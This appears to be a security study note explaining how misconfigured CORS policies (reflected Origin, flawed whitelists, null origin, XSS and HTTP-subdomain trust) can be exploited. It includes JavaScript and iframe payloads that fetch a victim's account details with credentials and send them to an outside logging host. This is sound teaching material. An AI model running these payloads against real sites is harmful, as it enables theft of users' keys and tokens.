---
title: Cross-Origin Resource Sharing (CORS)
category: Web
order: 18
---

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF). 

# Vulnerabilities arising from CORS configuration issues

Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities. 

## Server-generated ACAO header from client-specified Origin header

Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain. 

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request: 

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

It then responds with

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

These headers state that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session. 

If the response contains any sensitive information such as an API key or CSRF token, we can retrieve this with the following script:

```js
var req = new XMLHttpRequest();
req.onreadystatechange = function() {
	if (req.readyState == XMLHttpRequest.DONE){
		fetch("https://burpcollaborator.com/log?key=" + req.responseText)
	}
}

req.open('GET','https://example.com/accountDetails',true);
req.withCredentials = true;
req.send(null);
```
```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://burpcollaborator.com/log?key='+this.responseText;
};
```
## Errors parsing Origin headers

Some applications that support access from multiple origins do so by using a whitelist of allowed origins.

The application checks the supplied origin against its list of allowed origins and, if it is on the list allows the connection.

They can create some rules that can be bypassed:

* **Starts With**: Suppose an application grants access to all domains beginning with `example.com`. We can use `example.com.evil.com`
* **Ends With**: Suppose an application grants access to all domains ending in `example.com`. We can buy a domain something like `evil-example.com`.

## Whitelisted null origin value

The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:

* Cross-origin redirects.
* Requests from serialized data.
* Request using the `file:`` protocol.
* Sandboxed cross-origin requests.

Some applications might whitelist the `null` origin to support local development of the application.

```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

Example of payload to get the `null` origin value using a `iframe`:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://burpcollaborator.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## Exploiting XSS via CORS trust relationships

Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

## Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. An attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps: 

* The victim user makes a play HTTP request.
* The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`.
* The victim's browser follows the redirect.
* The attacker intercepts that plain HTTP request and returns a spoofed response containing a CORS request to `https://vulnerable-website.com`.
* The victim's browser makes the CORS request including the origin `http://trusted-subdomain.vulnerable-website.com`
* The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
* The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control. 

This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure. 
